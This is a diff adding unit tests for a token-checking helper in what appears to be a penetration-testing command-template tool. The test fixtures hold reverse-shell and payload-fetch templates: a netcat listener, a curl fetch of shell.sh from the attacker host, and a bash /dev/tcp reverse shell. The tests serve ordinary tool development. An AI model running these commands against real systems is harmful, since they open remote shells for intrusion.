@@ -4,6 +4,7 @@ import {
   formatDurationHuman,
   escapeRegex,
   interpolateCommand,
+  getUnresolvedTokens,
   sanitizeExternalUrl,
 } from './helpers';
 import { GlobalVariables } from '../types';
@@ -110,6 +111,50 @@ describe('helpers utility functions', () => {
       };
       const template = 'nmap {TARGET_IP} -l {LHOST} -p {LPORT}';
       expect(interpolateCommand(template, emptyVars)).toBe('nmap 10.10.10.X -l 10.10.14.X -p 4444');
+    });
+  });
+
+  describe('getUnresolvedTokens', () => {
+    it('detects unconfigured LHOST when lhost is empty or placeholder', () => {
+      const emptyVars: GlobalVariables = {
+        lhost: '',
+        lport: '4444',
+        targetIp: '10.10.10.50',
+        interface: 'tun0',
+        customVars: {},
+      };
+      expect(getUnresolvedTokens('nc -lvnp {LPORT} and revshell to {LHOST}', emptyVars)).toEqual(['LHOST']);
+
+      const placeholderVars: GlobalVariables = {
+        lhost: '10.10.14.X',
+        lport: '4444',
+        targetIp: '10.10.10.50',
+        interface: 'tun0',
+        customVars: {},
+      };
+      expect(getUnresolvedTokens('curl http://<LHOST>:8000/shell.sh', placeholderVars)).toEqual(['LHOST']);
+    });
+
+    it('returns empty array when all required variables are populated', () => {
+      const readyVars: GlobalVariables = {
+        lhost: '10.10.14.15',
+        lport: '9001',
+        targetIp: '10.10.11.200',
+        interface: 'tun0',
+        customVars: {},
+      };
+      expect(getUnresolvedTokens('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1', readyVars)).toEqual([]);
+    });
+
+    it('detects missing target IP and unreplaced custom tokens', () => {
+      const vars: GlobalVariables = {
+        lhost: '10.10.14.15',
+        lport: '9001',
+        targetIp: '',
+        interface: 'tun0',
+        customVars: {},
+      };
+      expect(getUnresolvedTokens('nmap -sC -sV {TARGET_IP} -p {CUSTOM_PORT}', vars)).toEqual(['TARGET_IP', 'CUSTOM_PORT']);
     });
   });
 
